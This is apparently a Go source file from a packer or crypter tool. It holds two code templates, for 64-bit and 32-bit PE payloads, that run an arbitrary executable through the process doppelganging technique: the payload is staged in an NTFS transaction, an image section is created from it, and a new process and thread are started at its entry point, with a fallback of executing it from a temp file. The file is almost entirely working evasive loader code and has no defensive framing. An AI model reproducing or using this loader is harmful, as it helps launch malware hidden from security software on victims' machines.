package windows

// ProcessDoppelRuntime implements a simplified TxF-based process doppelganging flow.
// Notes:
// - Uses CreateTransaction/CreateFileTransactedW to stage the payload.
// - Uses NtCreateSection(SEC_IMAGE) on the transacted handle, then NtCreateProcessEx + NtMapViewOfSection + NtCreateThreadEx to start execution.
// - Only enabled for amd64; PE32 will fall back to executeFromTemp in the stub.
const ProcessDoppelRuntime = `
func executeProcessDoppelganging(payload []byte) {
	if len(payload) < 0x200 {
		executeFromTemp(payload)
		return
	}
	if payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}

	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if peOffset > uint32(len(payload)-0x40) {
		executeFromTemp(payload)
		return
	}
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}

	opt := peOffset + 24
	entryRVA := binary.LittleEndian.Uint32(payload[opt+16:])

	tx, _, _ := procCreateTransaction.Call(0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("gosstrip_tx"))))
	if tx == 0 {
		executeFromTemp(payload)
		return
	}
	defer procRollbackTransaction.Call(tx)

	tmpPath := syscall.StringToUTF16Ptr(filepath.Join(os.TempDir(), ".doppel.tmp"))
	hFile, _, _ := procCreateFileTransacted.Call(
		uintptr(unsafe.Pointer(tmpPath)),
		uintptr(syscall.GENERIC_READ|syscall.GENERIC_WRITE),
		0,
		0,
		uintptr(syscall.CREATE_ALWAYS),
		uintptr(0x100), // FILE_ATTRIBUTE_TEMPORARY
		0,
		tx,
		0,
	)
	if hFile == 0 || hFile == ^uintptr(0) {
		executeFromTemp(payload)
		return
	}
	defer syscall.CloseHandle(syscall.Handle(hFile))

	var written uint32
	if err := windows.WriteFile(windows.Handle(hFile), payload, &written, nil); err != nil || int(written) != len(payload) {
		executeFromTemp(payload)
		return
	}

	const secImage = 0x1000000
	const pageExecuteRead = 0x20
	var sectionHandle uintptr
	status, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		0x10000000,
		0,
		0,
		uintptr(pageExecuteRead),
		uintptr(secImage),
		hFile,
	)
	if status != 0 || sectionHandle == 0 {
		executeFromTemp(payload)
		return
	}
	defer procNtClose.Call(sectionHandle)

	var procHandle uintptr
	status, _, _ = procNtCreateProcessEx.Call(
		uintptr(unsafe.Pointer(&procHandle)),
		0x1F0FFF,
		0,
		0,
		0, // inherit nothing
		sectionHandle,
		0,
		0,
		0,
	)
	if status != 0 || procHandle == 0 {
		executeFromTemp(payload)
		return
	}
	defer procNtClose.Call(procHandle)

	var base uintptr
	viewSize := uintptr(0)
	status, _, _ = procNtMapViewOfSection.Call(
		sectionHandle,
		procHandle,
		uintptr(unsafe.Pointer(&base)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		2, // ViewUnmap = 2
		0,
		uintptr(pageExecuteRead),
	)
	if status != 0 || base == 0 {
		executeFromTemp(payload)
		return
	}

	entry := base + uintptr(entryRVA)
	var threadHandle uintptr
	status, _, _ = procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF, // all access
		0,
		procHandle,
		entry,
		0,
		0,
		0,
		0,
		0,
		0,
	)
	if status != 0 || threadHandle == 0 {
		executeFromTemp(payload)
		return
	}
}
`

// ProcessDoppelRuntime32 mirrors the TXF doppelganging flow for PE32 payloads.
const ProcessDoppelRuntime32 = `
func executeProcessDoppelganging(payload []byte) {
	if len(payload) < 0x200 {
		executeFromTemp(payload)
		return
	}
	if payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}

	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if peOffset > uint32(len(payload)-0x40) {
		executeFromTemp(payload)
		return
	}
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}

	opt := peOffset + 24
	entryRVA := binary.LittleEndian.Uint32(payload[opt+16:])

	tx, _, _ := procCreateTransaction.Call(0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("gosstrip_tx"))))
	if tx == 0 {
		executeFromTemp(payload)
		return
	}
	defer procRollbackTransaction.Call(tx)

	tmpPath := syscall.StringToUTF16Ptr(filepath.Join(os.TempDir(), ".doppel32.tmp"))
	hFile, _, _ := procCreateFileTransacted.Call(
		uintptr(unsafe.Pointer(tmpPath)),
		uintptr(syscall.GENERIC_READ|syscall.GENERIC_WRITE),
		0,
		0,
		uintptr(syscall.CREATE_ALWAYS),
		uintptr(0x100), // FILE_ATTRIBUTE_TEMPORARY
		0,
		tx,
		0,
	)
	if hFile == 0 || hFile == ^uintptr(0) {
		executeFromTemp(payload)
		return
	}
	defer syscall.CloseHandle(syscall.Handle(hFile))

	var written uint32
	if err := windows.WriteFile(windows.Handle(hFile), payload, &written, nil); err != nil || int(written) != len(payload) {
		executeFromTemp(payload)
		return
	}

	const secImage = 0x1000000
	const pageExecuteRead = 0x20
	var sectionHandle uintptr
	status, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		0x10000000,
		0,
		0,
		uintptr(pageExecuteRead),
		uintptr(secImage),
		hFile,
	)
	if status != 0 || sectionHandle == 0 {
		executeFromTemp(payload)
		return
	}
	defer procNtClose.Call(sectionHandle)

	var procHandle uintptr
	status, _, _ = procNtCreateProcessEx.Call(
		uintptr(unsafe.Pointer(&procHandle)),
		0x1F0FFF,
		0,
		0,
		0,
		sectionHandle,
		0,
		0,
		0,
	)
	if status != 0 || procHandle == 0 {
		executeFromTemp(payload)
		return
	}
	defer procNtClose.Call(procHandle)

	var base uintptr
	viewSize := uintptr(0)
	status, _, _ = procNtMapViewOfSection.Call(
		sectionHandle,
		procHandle,
		uintptr(unsafe.Pointer(&base)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		2,
		0,
		uintptr(pageExecuteRead),
	)
	if status != 0 || base == 0 {
		executeFromTemp(payload)
		return
	}

	entry := base + uintptr(entryRVA)
	var threadHandle uintptr
	status, _, _ = procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&threadHandle)),
		0x1FFFFF,
		0,
		procHandle,
		entry,
		0,
		0,
		0,
		0,
		0,
		0,
	)
	if status != 0 || threadHandle == 0 {
		executeFromTemp(payload)
		return
	}
}
`
